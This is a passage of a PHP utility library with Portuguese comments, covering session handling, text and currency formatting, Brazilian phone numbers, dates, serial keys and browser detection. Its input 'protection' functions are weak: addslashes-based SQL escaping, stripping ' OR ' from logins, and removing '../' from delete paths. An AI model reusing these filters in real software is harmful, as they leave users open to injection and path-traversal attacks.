<?php 


// INICIO FUNÇÕES DO SISTEMA -----------------##############@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>>>>>>>>>>>>>>>>>>>>>>>













### funcoes diversas do sistema ########################>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


//########################### iniciar funcoes de LOGIN ------------------>>>


//funcao que seta sessoes do siatema
function sessoes($nome_var,$var){
	$_SESSION["$nome_var"] = $var;
}//fim da funcao que seta a sessoes

//funcao que verifica  a existencia de sessoes do siatema
function sessoes_v($nome_var){
	if(isset($_SESSION["$nome_var"])){
		$result = "1";
	}else{
		$result = "0";
	}
	return $result;
}//fim da funcao que seta a sessoes

//funcao que imprime sessoes do siatema
function sessoes_p($nome_var){
	return $_SESSION["$nome_var"];
}//fim da funcao que seta a sessoes

//funcao que destroe as sessoes
function sessoes_OFF($nome_var){
	session_unregister("$nome_var");
}//fim da funcao que destroe sessoes


//########################### finaliza funcoes de LOGIN ------------------<<<





//função do PHP para ajuste de stripslashes
function stripslashes_deep($value){
    $value = is_array($value) ?
                array_map('stripslashes_deep', $value) :
                stripslashes($value);

    return $value;
}//stripslashes_deep








//função que remove item de uma STRING
function emove_it($var, $string){
	$string = str_replace($var, "", $string);
	return $string;
}//fim da funcao emove_it




//funcao cria array de numeros para banco de dados
/*
Ex. USO: , ou .
echo dados_arraydb("2,5"); sair do DB
echo dados_arraydb("[,1,2,5,]","1"); - ir para DB
*/
function arrayDB($dados,$acao=""){
	if(($dados != "") and ($acao == "")){
		if(preg_match("/\[\./i", $dados)){ $converte = "dec-ponto"; }
		if(preg_match("/\[\,/i", $dados)){ $converte = "dec-virgula"; }

		if($converte == "dec-ponto"){
			$dados = str_replace("[.", "", $dados);
			$dados = str_replace(".]", "", $dados);
		}
		if($converte == "dec-virgula"){
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
		}
	}
	if((($dados != "") and ($acao != "")) or ($acao == "CONT")){
		if($acao == "."){
			$dados = str_replace("[.", "", $dados);
			$dados = str_replace(".]", "", $dados);
			$dados = "[.".$dados.".]";
		}
		if($acao == ","){
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
			$dados = "[,".$dados.",]";
		}
		if($acao == "CONT"){
			$dados = str_replace(" ", "", $dados);
			$dados = str_replace('[,]', "", $dados);
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
			$dados = str_replace('[.]', "", $dados);
			$dados = str_replace("[.", "", $dados);
			$dados = str_replace(".]", "", $dados);
			if($dados == "0"){ $dados = ""; }//se id for 0, remove da contagem
			if($dados == "NULL"){ $dados = ""; }//se id for NULL, remove da contagem
			if($dados != ""){
				$cont = "1";//faz incremento para contagem correta
				$cont = substr_count($dados, ',')+$cont;
				$dados = substr_count($dados, '.')+$cont;
			}else{ $dados = "0"; }
		}
	}
	return $dados;
}////fim da função



//funcao prepara string para soma de valores
function valSoma($dados){
	$dados = str_replace("d", "", $dados); $dados = str_replace("D", "", $dados);
	if(($dados == "") or ($dados == " ") or ($dados == "  ")){ $dados = "0"; }
	if(preg_match("/\./i", $dados)){ $ponto = "1"; }else{ $ponto = "0"; }
	if(preg_match("/\,/i", $dados)){ $virgula = "1"; }else{ $virgula = "0"; }
	if(($ponto == "1") and ($virgula == "1")){
		$dados = str_replace(".", "", $dados);
		$dados = str_replace(",", ".", $dados);
	}
	if(($ponto == "0") and ($virgula == "1")){
		$dados = str_replace(",", ".", $dados);
	}
	return $dados;
}////fim da função valSoma



//Função para soma de ARRAY
//Exemplo: $arr["0"] = "2"; $arr["1"] = "2"; echo arraySum($arr);//Res: 4
function arraySum($array){
	if((is_array($array)) and ($array != NULL)){ $soma = array_sum($array); }else{ $soma = "0"; }
	return $soma;
}//arraySum



//funcao cria array de numeros para banco de dados
/*
Ex. USO:
echo dados_arraydb("1[,]2[,]5"); sair do DB
echo dados_arraydb("[,1,2,5,]","1"); - ir para DB
*/
function dados_arraydb($dados,$acao='0'){
	if($dados != ""){
		if($acao == "1"){
			$dados = str_replace("[,]", ",", $dados);
			if(($dados != "") and ($dados != ",")){ $dados = "[,".$dados.",]"; }else{ $dados = ""; }
		}else{
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
			$dados = str_replace(",", "[,]", $dados);
		}
		//preparar para combo
		if($acao == "combo"){
			$dados = str_replace("[/d/]", ",", $dados);
			$dados = "[".$dados."]";
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
			$dados = str_replace("[", "", $dados);
			$dados = str_replace("]", "", $dados);
		}
		if(($acao == "[/d/]") and ($dados != "")){
			$dados = str_replace("[", "", $dados);
			$dados = str_replace("]", "", $dados);
			$dados = str_replace(",", "[/d/]", $dados);
			$dados = "[/d/]".$dados."[/d/]";
		}
		if(($acao == "[/d/]s") and ($dados != "")){
			$dados = str_replace("[", "", $dados);
			$dados = str_replace("]", "", $dados);
			$dados = str_replace(",", "[/d/]", $dados);
		}
	}
	return $dados;
}////fim da função


//funcao cria array de numeros para banco de dados
/*
Ex. USO:
echo numeric_arraydb("1,2,5"); sair do DB
echo numeric_arraydb("[,1,2,5,]","1"); - ir para DB
*/
function numeric_arraydb($dados,$acao='0'){
	if($dados != ""){
		if($acao == "1"){
			$dados = str_replace("[,]", ",", $dados);
			if(($dados != "") and ($dados != ",")){ $dados = "[,".$dados.",]"; }else{ $dados = ""; }
		}else{
			$dados = str_replace("[,", "", $dados);
			$dados = str_replace(",]", "", $dados);
			$dados = str_replace("[,]", ",", $dados);
		}
	}
	return $dados;
}////fim da função numeric_arraydb



//funcao remove html
function remove_html($html,$limpa='0'){
	if($limpa == "1"){
		$html = strip_tags($html);
		$html = str_replace("&nbsp", "", $html);
	}
	if($limpa == "texto"){
		$html = strip_tags($html, '<(.*?)>');
	}
	if($limpa == "0"){
		$html = str_replace("<", "&lt;", $html);
		$html = str_replace(">", "&gt;", $html);
		$html = str_replace("'", "", $html);
		$html = str_replace("\"", "", $html);
	}
	return $html;
}//exemplo: echo remove_html($valores); 
//fim da função de remoção html




//função para limpeza de html e criação de texto plano para envios de email
function limpaHtmlSendMail($text) {
	$text = strip_tags($text,"<style>");
	$substring = substr($text,strpos($text,"<style"),strpos($text,"</style>")+2);
	//echo "<br><br><br>".$substring."<br><br><br>";
	$text = str_replace($substring,"",$text);
	//$text = str_replace(array("\t","\r","\n"),"",$text);
	$text = str_replace("tyle>","",$text);
	$text = trim($text);
	
	return $text;

}//limpaHtmlSendMail




//funcao prepara valor GRAFICO
function valorGrafico($valor){
	$valor = str_replace(",", ".", $valor);
	return $valor;
}//fim valorGrafico função de remoção GRAFICO




//verifica se número é um celular ou fixo
function identificaTelefone($NUM){
	$ret = "NULO";
	$NUM = str_replace(array(".","-"," ","(",")","+"),"",$NUM);//limpa numero
	$primeiro = substr($NUM,0,1);//pega primeiro digito
	if($primeiro == "0"){
		$identificador = substr($NUM,3,1);//pega identificador
	}else{
		$identificador = substr($NUM,2,1);//pega identificador		
	}
	if($identificador >= "7"){ $ret = "CELULAR"; }else{ $ret = "FIXO"; }
	return $ret;
}//identificaTelefone



//adiciona o nono digito em número de celular brasil
function nonoDigito($NUM){
	$ret = $NUM;
	if(strlen($NUM) == "12"){
		$ret = substr($NUM,0,4)."9".substr($NUM,4,15);
	}//if(strlen($NUM) == "12"){
	return $ret;
}//nonoDigito





//cria um número de celular com privacidade, ocultando parte do número
function privCelular($NUM){
	$NUM = str_replace(array(".","-"," ","(",")","+"),"",$NUM);//limpa celular		
	//esconde numero de celular
	$ini = substr($NUM, 0, 1);
	$fim = substr($NUM, -2);
	$ret = "(".$ini."*) *****-**".$fim;
	return $ret;
}//privCelular





//cria uma formatação para o número de telefone
function formadaTelBR($NUM){
	$TEL = str_replace(array(".","-"," ","(",")","+"),"",$NUM);//limpa 
    $tam = strlen(preg_replace("/[^0-9]/", "", $TEL));
      if ($tam == 13) { // COM CÓDIGO DE ÁREA NACIONAL E DO PAIS e 9 dígitos
      return "+".substr($TEL,0,$tam-11)."(".substr($TEL,$tam-11,2).")".substr($TEL,$tam-9,5)."-".substr($TEL,-4);
      }
      if ($tam == 12) { // COM CÓDIGO DE ÁREA NACIONAL E DO PAIS
      return "+".substr($TEL,0,$tam-10)."(".substr($TEL,$tam-10,2).")".substr($TEL,$tam-8,4)."-".substr($TEL,-4);
      }
      if ($tam == 11) { // COM CÓDIGO DE ÁREA NACIONAL e 9 dígitos
      return "(".substr($TEL,0,2).")".substr($TEL,2,5)."-".substr($TEL,7,11);
      }
      if ($tam == 10) { // COM CÓDIGO DE ÁREA NACIONAL
      return "(".substr($TEL,0,2).")".substr($TEL,2,4)."-".substr($TEL,6,10);
      }
      if ($tam <= 9) { // SEM CÓDIGO DE ÁREA
      return substr($TEL,0,$tam-4)."-".substr($TEL,-4);
      }
}//formadaTelBR







//******************************************************************** 
// Função para retornar toda a variável sen assentos. 
//******************************************************************** 
function semacentos($string){ // Coloca todo conteúdo da variavel sem assentos. 
	$string = str_replace("á","a",$string); 
	$string = str_replace("é","e",$string); 
	$string = str_replace("í","i",$string); 
	$string = str_replace("ó","o",$string); 
	$string = str_replace("ú","u",$string); 
	$string = str_replace("â","a",$string); 
	$string = str_replace("ê","e",$string); 
	$string = str_replace("ô","o",$string); 
	$string = str_replace("î","i",$string); 
	$string = str_replace("û","u",$string); 
	$string = str_replace("ã","a",$string); 
	$string = str_replace("õ","o",$string); 
	$string = str_replace("ç","c",$string); 
	$string = str_replace("à","a",$string); 
	$string = str_replace("è","e",$string); 
	
	$string = str_replace("Á","A",$string); 
	$string = str_replace("É","E",$string); 
	$string = str_replace("Í","I",$string); 
	$string = str_replace("Ó","O",$string); 
	$string = str_replace("Ú","U",$string); 
	$string = str_replace("Â","A",$string); 
	$string = str_replace("Ê","E",$string); 
	$string = str_replace("Ô","O",$string); 
	$string = str_replace("Î","I",$string); 
	$string = str_replace("Û","U",$string); 
	$string = str_replace("Ã","A",$string); 
	$string = str_replace("Õ","O",$string); 
	$string = str_replace("Ç","C",$string); 
	$string = str_replace("À","A",$string); 
	$string = str_replace("È","E",$string); 
	return $string; 
}//fim semacentos($string)



//funcao gera KEY(alfanumerica) unico
/*
Exemplo de USO:
echo key_rand();//imprime: 77d018b49bad0e75f1b908e794370b14 (numero unico)
*/
function key_rand($var=''){
//monta numero para envio
	return md5($var.uniqid(time().rand(), true));
}//function 
//fim gera KEY(alfanumerica) unico




///***************************** cria e verifica serial *****************************///////////
/*cria o serial
exemplo: $serial = getSerial( 'VERIFICADOR NOME' );
*/
function getSerial($name = null, $divisor=''){
	$a = hash( 'crc32' , 'chave secreta' );
	$b = hash( 'crc32' , sprintf( '%s%s' , md5( $name ) , md5( $a ) ) );
	$c = sscanf( sprintf( '%s%s' , $a , $b ) , '%4s%4s%4s%4s' );
	$d = 1;
	
	for ( $i = 0 ; $i < 4 ; $i++ )
	for ( $j = 0 ; $j < 4 ; $d += pow( ord( $c[ $i ]{ $j } ) , $i ) , $j++ );
	
	$c[ 4 ] = $d;
	
	return vsprintf( '%s'.$divisor.'%s'.$divisor.'%s'.$divisor.'%s'.$divisor.'%05x' , $c );
}
/* verifica serial
Exemplo: validaSerial( $serial )ç
*/
function validaSerial($serial, $divisor=''){
	$c = sscanf( $serial , '%4s'.$divisor.'%4s'.$divisor.'%4s'.$divisor.'%4s' );
	$d = 1;
	
	for ( $i = 0 ; $i < 4 ; $i++ )
	for ( $j = 0 ; $j < 4 ; $d += pow( ord( $c[ $i ]{ $j } ) , $i ) , $j++ );
	
	$c[ 4 ] = $d;
	
	return !strcmp( $serial , vsprintf( '%s-%s-%s-%s-%05x' , $c ) );
}
///***************************** cria e verifica serial *****************************///////////






//funcao monta NUMERO DE SMS
/*
Exemplo de USO:
$var = "556232320000";
echo monta_SMS($var);//imprime: (62)3232-0000
*/
function monta_SMS($numero,$pref='1'){
//monta numero para retorno
	$n_br = substr($numero,0,2);
	$n_ddd = substr($numero,2,2);
	$n_cel = substr($numero,4,8);
	$n_cel1 = substr($numero,4,4);
	$n_cel2 = substr($numero,8,4);
	$numero_r = "$n_br ($n_ddd)$n_cel";
	if($pref == "1"){
		$numero_r = "(".$n_ddd.")".$n_cel1."-".$n_cel2;// (62) 3232-0000
	}
	return $numero_r;
}//function 
//fim monta NUMERO DE SMS







//Função primeiro_nome($nome)
/*
Exemplo de USO:
*/
function primeiro_nome($nome, $qtd='0', $limita='0', $fim=''){
	$part = explode(" ", $nome);
	$n_nome = $nome;
	if($qtd == "0"){
		$n_nome = $part["0"];
		if(strlen($n_nome) < "3"){ $n_nome = $part["0"]." ".$part["1"]; }
	}	
	if($qtd == "1"){
		$n_nome = $part["0"];
	}
	if($qtd == "2"){
		$n_nome = $part["0"]." ".$part["1"];
		if(strlen($part["1"]) < "3"){ $n_nome .= " ".$part["2"]; }
	}
	if($qtd == "3"){
		$n_nome = $part["0"]." ".$part["1"];
		if(strlen($part["1"]) < "3"){
			$n_nome .= " ".$part["2"];
			if(strlen($part["2"]) < "3"){ $n_nome .= " ".$part["3"]; }
		}else{
			$n_nome .= " ".$part["2"];
			if(strlen($part["2"]) < "3"){ $n_nome .= " ".$part["3"]; }
		}
	}
	if($limita >= "1"){
		//reduz nomes
		if(strlen($n_nome) > $limita){ $n_nome = substr($n_nome,0,$limita).$fim; }
	}
	return $n_nome;
}//fim função - primeiro_nome($nome)








//Função Moeda formataValor($valor,$prefixo='',$decimal=',',$milhar='',$casas='2')
/*
Exemplo de USO:
echo formataValor($valor,$prefixo='',$decimal=',',$milhar='',$casas='2'); 
*/
function formataValor($valor,$prefixo='',$decimal=',',$milhar='.',$casas='2'){
	if($valor != ""){
		$valor = str_replace(",", ".", $valor);	
		$valor = str_replace(" ", "", $valor);	
		$valor = str_replace("R$", "", $valor);	
		return $prefixo.number_format($valor, $casas, $decimal, $milhar);
	}else{ return ""; }
}//fim funcao formataValor











//função que string com marcador BASE64_
//se existe o marcador no texto já retorna o decode
function marcadorBASE64_($string){
	$marcador = substr($string,0,7);
	if($marcador == "BASE64_"){
		$string = utf8_encode(base64_decode(urldecode(str_replace($marcador, "", $string))));
	}
	return $string;
}//marcadorBASE64_








//Função remove_prefixo($valor,$prefixo_extra)
/*
Exemplo de USO:
echo remove_prefixo("R$ 20,00 M","M"); //20,00
*/
function removePrefixo($valor,$prefixo_extra=''){
	$valor = str_replace("M ", "", $valor);
	$valor = str_replace(" ", "", $valor);	
	$valor = str_replace("R$", "", $valor);	
	$valor = str_replace("%", "", $valor);	
	return $valor;
}//fim funcao remove_prefixo()







//Função verifica caracter especial pra javascript
//remover caracter javascript
function javaCaracter($valor,$acao="'"){
	if($acao == "'"){ $valor = str_replace("'", "", $valor); }
	if($acao == "\'"){ $valor = str_replace("'", "\'", $valor); }
	if($acao == '"'){ $valor = str_replace('"', '', $valor); }
	if($acao == '\"'){ $valor = str_replace('"', '\"', $valor); }
	return $valor;
}//fim funcao javaCaracter()



//Função imprime_enter($valor)
/*
Exemplo de USO:
echo imprime_enter(valor); // retorna os <entres> capturados como <br>
*/
function imprime_enter($valor){
	$valor = nl2br($valor);
	$valor = str_replace("\r\n","",$valor);
	$valor = str_replace("\r","",$valor);
	$valor = str_replace("\n","",$valor);
	return $valor;
}//fim funcao imprime_enter()





//Função timefaisher($r_time='')
/*
Exemplo de USO:
echo timefaisher(valor); // retorna data e hora com formano timefaisher
*/
function timefaisher($r_time='',$acao='gerar',$tipo='padrao'){
	if($acao == "gerar"){
		if($r_time == ""){ $r_time = time(); }
		if($tipo == "padrao"){//converte dados time() linux
			$valor = date('YmdHis', $r_time);	
		}
		if($tipo == "datahora"){ //converte dados 13/04/2012 14:35
			$s = explode(" ", $r_time);
			$d = explode("/", $s[0]);
			$h = explode(":", $s[1]);
			$dia1 = $d[0]; // Dia inicial da contagem regressiva
			$mes1 = $d[1]; // Mês inicial da contagem regressiva
			$ano1 = $d[2]; // Ano inicial da contagem regressiva
			$hora1 = $h[0]; // Hora inicial do evento (depende do fuso servidor - não recomendo o uso)
			$minuto1 = $h[1]; // Minuto inicial do evento (depende do fuso servidor - não recomendo o uso)
			$valor = $ano1.completa_zero($mes1).completa_zero($dia1).completa_zero($hora1).completa_zero($minuto1)."00";
		}
	}//fim if($acao == "gerar"){
	if($acao == "ler"){
	  //verifica codigo se tem quantidade de caracteres
	  $qtd_codigo = strlen($r_time);
	  if($qtd_codigo == "14"){
		//monta separadores da leitura
		$ano = substr($r_time,0,4);//item
		$anoo = substr($r_time,2,2);//item
		$mes = substr($r_time,4,2);//item
		$dia = substr($r_time,6,2);//item
		$hor = substr($r_time,8,2);//item
		$min = substr($r_time,10,2);//item
		$seg = substr($r_time,12,2);//item
		//tipo de retorno
		if($tipo == "padrao"){ 		$valor = $dia."/".$mes."/".$ano." ".$hor.":".$min.":".$seg; }
		if($tipo == "data"){ 		$valor = $dia."/".$mes."/".$ano; 							}
		if($tipo == "datas"){ 		$valor = $dia."/".$mes."/".$anoo; 							}
		if($tipo == "D"){ 			$valor = $dia;					 							}
		if($tipo == "M"){ 			$valor = $mes;					 							}
		if($tipo == "AA"){	 		$valor = $ano; 												}
		if($tipo == "A"){	 		$valor = $anoo; 											}
		if($tipo == "hora"){ 		$valor = $hor.":".$min.":".$seg; 							}
		if($tipo == "horas"){ 		$valor = $hor.":".$min;			 							}
		if($tipo == "hh"){	 		$valor = $hor;					 							}
		if($tipo == "mm"){ 			$valor = $min; 												}
		if($tipo == "ss"){ 			$valor = $seg;					 							}
		if($tipo == "datahora"){ 	$valor = $dia."/".$mes."/".$ano." ".$hor.":".$min; 			}
	  }else{ $valor = "Vazio"; }
	}//fim if($acao == "gerar"){
	return $valor;
}//fim funcao timefaisher()



//funcao que informa o tamanho de uma pasta, total
/*
Exemplo de uso:
$tamanho_total = tamanho_pasta("upload/usuarios/user");
echo"<b>Tamanho da Pasta em MB: </b> - $tamanho_total MB";
*/
function tamanho_pasta_FUNC($path){
	$tamanho_total = "0";
	 if ($dir = opendir($path)){
	 while(false !== ($file = readdir($dir))){
		if(is_dir($path."/".$file)){ 
			if($file != '.' && $file != '..'){ 
			 $tamanho_total = $tamanho_total + tamanho_pasta_FUNC($path."/".$file);
			 }
		 }else{ 
		 	$tamanho_total = $tamanho_total + filesize ($path.'/'.$file);
		 }
	 }
	 closedir($dir);
	}
	return $tamanho_total;
}
function tamanho_pasta($path){
	$tamanho_total = tamanho_pasta_FUNC($path);//path da sua pasta
	$tamanho_total = round($tamanho_total / 1024 / 1024, 2);
	return $tamanho_total;
}
//fim funcao que informa o tamanho de uma pasta, total




















//trata vars GET x POST NO MYSQL
function getpost_sql($string,$extra='0'){
	//$string = utf8_decode($string);
	$string = trim($string);
	$string = addslashes($string);
	if($extra != "HTML"){ $string = get_magic_quotes_gpc() ? stripslashes($string) : $string;  }else{ $string = str_replace('\"','"',$string); }//remove HTML
	//$string = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($string) : mysql_escape_string($string);
	$string = str_replace('<script','< script',$string);
	$string = str_replace('</script','< /script',$string);
	if($extra == "0"){
		$string = str_replace('\"','"',$string);
	}
	if($extra == "MAIUSCULO"){
		$string = maiusculo($string);
	}
	if($extra == "MINUSCULO"){
		$string = minusculo($string);
	}
	if($extra == "ENTER"){
		$string = nl2br($string);
		$string = str_replace("\r\n","",$string);
		$string = str_replace("\r","",$string);
		$string = str_replace("\n","",$string);
	}
	if($extra == "DIVISOR"){
		$string = str_replace('[,]','',$string);
		$string = str_replace('[-]','',$string);
	}
	if($extra == "FILE"){
		$string = str_replace('\"','"',$string);
		$string = str_replace('\n','',$string);
	}
	if($extra == "DOC"){
		$string = str_replace('.','',$string);
		$string = str_replace('-','',$string);
		$string = str_replace('/','',$string);
	}
	if($extra == "CELULAR"){
		$string = str_replace(array(".","-"," ","(",")","+"),"",$string);//limpa celular
		if(strlen($string) == "10"){ $string = substr($string,0,2)."9".substr($string,2,20); }//asiciona o nono digito		
	}
	if($extra == "PREFIXO"){
		$string = removePrefixo($string);
	}
	if($extra == "VALOR"){
		$string = removePrefixo($string);
		$string = valSoma($string);
	}
	if($extra == "VALOR_VALIDA"){
		$string = removePrefixo($string);
		$string = valSoma($string);
		if(!is_numeric($string)){ $string = 0; }
	}
	if($extra == "enc"){
		$string = utf8_encode($string);
	}
	if($extra == "dec"){
		$string = utf8_decode($string);
	}
	if($extra == "url_enc"){
		$string = urlencode($string);
	}
	if($extra == "url_dec"){
		$string = urldecode($string);
	}
	if($extra == "DATA"){
		$string = data_mysql($string);
		if(($string == "") or ($string == "00/00/0000") or ($string == "0000-00-00")){ $string = 'NULL'; }
	}
	if($extra == "NULL"){
		if($string == ""){ $string = 'NULL'; }
	}
	if($extra == "ARRAY-P"){
		$string = str_replace(',','.',$string);
		if(($string == "") or ($string == "NULL")){ $string = 'NULL'; }else{
			$string = "[.".$string.".]";
		}
	}
	if($extra == "ARRAY-V"){
		if($string == ""){ $string = 'NULL'; }else{
			$string = "[,".$string.",]";
		}
	}
	if($extra == "JS"){
		$string = str_replace("'","",$string);
		$string = str_replace('\"','',$string);
	}
	return $string;
}//fim get post











//trata vars Print na tela
function varsPrint($string,$extra='POP'){
	if($extra == "POP"){
		$string = str_replace("'","",$string);
	}
	if($extra == "FILE"){
		$string = str_replace('\"','"',$string);
		$string = str_replace("\'","'",$string);
	}
	return $string;
}//fim varsPrint




//limpa os campos de login no site apara maior seguranca
function senha_seg($var){
	$var = str_replace("'", "", $var);
	$var = str_replace(" OR ", "O-", $var);
	$var = str_replace(" || ", "|-|", $var);
	return $var;
}//fim da protecao de senha





//função procura texto na string e coloca tags
/*
*/
function coloca_tags($texto, $string, $tagi='<b>', $tagf='</b>'){
	$retorno = str_replace($texto, $tagi.$texto.$tagf, $string);
	return $retorno;
}//fim função coloca_tags($texto, $string, $tagi='<b>', $tagf='</b>')



//retorna os valores de um campo de cadastro
//função que verifica a existencia de um id no array, caso nao exista, retorna vazio
function campo_retorno($campo,$array,$full=""){
	if(isset($array["$campo"])){
		$var = $array["$campo"];
	}else{
		$var = $full;
	}
	return $var;
}//fim da funcao de retorno de valores





//Fumção remove arquivos de pastas - função perigosa
//exemplo de como usar
//$file = "pasta/subpasta"; ou $file = "teste/5/file.jpg"; - o caminho é apartir do arquivo de execução
//delete("teste/ola");
// faça a chamada da função passando o nome do diretório para $file
function delete($file) {
	if(file_exists($file)) {
	 //  chmod($file,0777);
	   if (is_dir($file)) {
		 $handle = opendir($file);
		 while($filename = readdir($handle)) {
		   if ($filename != "." && $filename != "..") {
			delete($file."/".$filename);
		   }
		 }
		closedir($handle);
		 rmdir($file);
	   } else {
		unlink($file);
	   }
	}
}//fim função remove arquivos e pastas


//Fumção remove itens de delete - proteger 
function deleteSEG($file) {
	$file = str_replace("../","",$file);
	$file = str_replace("./","",$file);
	return $file;
}//deleteSEG





//##inicio função cria o pasta/diretório
//Exemplo:
// $cria = cria_pasta("caminho/caminho/[pasta a criar]"); //confere a criação e retona 1
function cria_pasta($caminho, $permissao='0775'){
	if(!file_exists($caminho)){ //verifica se ja existe
		///cria o diretorio
		// mkdir ($caminho, $permissao);
		mkdir($caminho, 0775);
		chmod($caminho, 0775);
		 if(file_exists($caminho)){ //verifica se criou
			 return 1;
		 }else{//retorna 1 para sucesso e 0 erro
			 return 0;
		 }
	}else{
		return 0;
	}
}////##fim função cria o pasta/diretório




//verificar qual navegador o cliente esta usando
function ver_navegador($useragent="",$tipo='0'){
  if($useragent == ""){ $useragent = $_SERVER['HTTP_USER_AGENT']; }
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  if($tipo == "0"){
  	$retorno = "$browser $browser_version";
  }else{
	$retorno = "$browser";
  }
  return $retorno;
}//fim function
//fim verificar qual navegador o cliente esta usando







/* busca sistema operacional */
function sistemaOperacional($agent){
	$sistema = "Indeterminado";
// ---- Mobile ----
    // Android
    $android = strpos($agent, 'Android') ? true : false;
	if(($android) and ($sistema == "Indeterminado")){ $sistema = "Android"; }
    // BlackBerry
    $blackberry = strpos($agent, 'BlackBerry') ? true : false;
	if(($blackberry) and ($sistema == "Indeterminado")){ $sistema = "BlackBerry"; }
    // iPhone
    $iphone = strpos($agent, 'iPhone') ? true : false;
	if(($iphone) and ($sistema == "Indeterminado")){ $sistema = "iPhone"; }
    // Palm
    $palm = strpos($agent, 'Palm') ? true : false;
	if(($palm) and ($sistema == "Indeterminado")){ $sistema = "Palm"; }
// ---- Desktop ----
    // Linux
    $linux = strpos($agent, 'Linux') ? true : false;
	if(($linux) and ($sistema == "Indeterminado")){ $sistema = "Linux"; }
    // Macintosh
    $mac = strpos($agent, 'Macintosh') ? true : false;
	if(($mac) and ($sistema == "Indeterminado")){ $sistema = "Macintosh"; }
    // Windows
    $win = strpos($agent, 'Windows') ? true : false;
	if(($win) and ($sistema == "Indeterminado")){ $sistema = "Windows"; }
	
	return $sistema;
}//sistemaOperacional








/*FUNCAO DE VERIFICACAO DE DEVICE
Funcao que retorna o equipamento de acesso*/
function mobile_device_detect($cookie=''){
  $mobile_browser   = "DESKTOP"; // set mobile browser as false till we can prove otherwise
  $user_agent       = $_SERVER['HTTP_USER_AGENT']; // get the user agent value - this should be cleaned to ensure no nefarious input gets executed
  $accept           = $_SERVER['HTTP_ACCEPT']; // get the content accept value - this should be cleaned to ensure no nefarious input gets executed
  switch(true){ // using a switch against the following statements which could return true is more efficient than the previous method of using if statements
    case (preg_match('/ipod/i',$user_agent)||preg_match('/iphone/i',$user_agent)); // we find the words iphone or ipod in the user agent
      $mobile_browser = "iphone"; // mobile browser is either true or false depending on the setting of iphone when calling the function
    break; // break out and skip the rest if we've had a match on the iphone or ipod
    case (preg_match('/ipad/i',$user_agent)); // we find the words iphone or ipod in the user agent
      $mobile_browser = "ipad"; // mobile browser is either true or false depending on the setting of iphone when calling the function
    break; // break out and skip the rest if we've had a match on the iphone or ipod
    case (preg_match('/android/i',$user_agent));  // we find android in the user agent
      $mobile_browser = "android"; // mobile browser is either true or false depending on the setting of android when calling the function
    break; // break out and skip the rest if we've had a match on android
    case (preg_match('/opera mini/i',$user_agent)); // we find opera mini in the user agent
      $mobile_browser = "opera"; // mobile browser is either true or false depending on the setting of opera when calling the function
    break; // break out and skip the rest if we've had a match on opera
    case (preg_match('/blackberry/i',$user_agent)); // we find blackberry in the user agent
      $mobile_browser = "blackberry"; // mobile browser is either true or false depending on the setting of blackberry when calling the function
    break; // break out and skip the rest if we've had a match on blackberry
    case (preg_match('/(palm os|palm|hiptop|avantgo|plucker|xiino|blazer|elaine)/i',$user_agent)); // we find palm os in the user agent - the i at the end makes it case insensitive
      $mobile_browser = "palm"; // mobile browser is either true or false depending on the setting of palm when calling the function
    break; // break out and skip the rest if we've had a match on palm os
    case (preg_match('/(windows ce; ppc;|windows ce; smartphone;|windows ce; iemobile)/i',$user_agent)); // we find windows mobile in the user agent - the i at the end makes it case insensitive
      $mobile_browser = "windows"; // mobile browser is either true or false depending on the setting of windows when calling the function
    break; // break out and skip the rest if we've had a match on windows
    case (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|vodafone|o2|pocket|kindle|mobile|pda|psp|treo)/i',$user_agent)); // check if any of the values listed create a match on the user agent - these are some of the most common terms used in agents to identify them as being mobile devices - the i at the end makes it case insensitive
      $mobile_browser = true; // set mobile browser to true
    break; // break out and skip the rest if we've preg_match on the user agent returned true 
    case ((strpos($accept,'text/vnd.wap.wml')>0)||(strpos($accept,'application/vnd.wap.xhtml+xml')>0)); // is the device showing signs of support for text/vnd.wap.wml or application/vnd.wap.xhtml+xml
      $mobile_browser = "mobile"; // set mobile browser to true
    break; // break out and skip the rest if we've had a match on the content accept headers
    case (isset($_SERVER['HTTP_X_WAP_PROFILE'])||isset($_SERVER['HTTP_PROFILE'])); // is the device giving us a HTTP_X_WAP_PROFILE or HTTP_PROFILE header - only mobile devices would do this
      $mobile_browser = "mobile"; // set mobile browser to true
    break; // break out and skip the final step if we've had a return true on the mobile specfic headers
